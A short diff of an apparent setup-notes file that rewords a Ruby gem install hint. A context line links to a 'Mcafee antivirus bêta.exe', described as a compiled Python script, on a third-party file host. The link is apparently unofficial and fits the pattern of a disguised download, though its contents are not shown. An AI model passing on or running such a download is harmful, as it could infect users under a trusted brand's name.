@@ -16,7 +16,7 @@ install perl modules: cpan install
 
 run ruby : ruby file.rb
 
-ruby install : gem install (modules) and (modules) install
+ruby install : gem install (modules) and open Gemfile for view requirements
 
 
 download Mcafee antivirus bêta.exe (script python compiled) : http://download1474.mediafire.com/7v9qb778apqg/geatwts7ba2hlbt/mcafee+antivirus+b%C3%AAta.rar
